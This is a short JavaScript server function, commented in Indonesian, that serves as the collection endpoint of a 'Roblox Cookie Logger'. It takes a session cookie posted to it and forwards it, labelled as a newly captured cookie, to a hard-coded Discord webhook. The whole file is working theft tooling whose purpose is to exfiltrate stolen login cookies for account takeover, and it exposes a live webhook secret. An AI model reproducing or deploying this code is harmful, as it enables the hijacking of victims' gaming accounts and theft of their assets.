// Import library node-fetch
import fetch from 'node-fetch';

export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ message: 'Method Not Allowed' });
    }

    const { cookie } = req.body;

    if (!cookie) {
        return res.status(400).json({ message: 'Cookie is required' });
    }

    const discordWebhookUrl = 'https://discord.com/api/webhooks/1473284471137767558/asp42MiZ5mb6XaOXVNRmiyVsxVl5tG5AeWy6pJ2TXq8-0Ak-Y6tuuozHpVLlySDbPHlG';

    // !!! SOLUSI: KITA POTONG COOKIE-NYA BIAR NGGAK KELEWATAN BATAS !!!
    const shortCookie = cookie.substring(0, 1000); // Ambil 1000 karakter pertama

    const payload = {
        // Kita kirim yang pendek, plus info panjang aslinya
        content: `🍪 **Cookie Baru Tertangkap!** (Panjang: ${cookie.length} char)\n\`\`\`${shortCookie}...\`\`\``,
        username: "Roblox Cookie Logger",
        avatar_url: "https://i.imgur.com/rVw5B2W.png"
    };

    try {
        // Kita kembali ke mode "fire and forget" biar cepet
        fetch(discordWebhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
        }).catch(error => console.error('Gagal kirim ke Discord (async):', error));

        res.status(200).json({ message: 'Success' });

    } catch (error) {
        console.error('Fatal error in server function:', error);
        res.status(500).json({ message: `Server Error: ${error.message}` });
    }
}
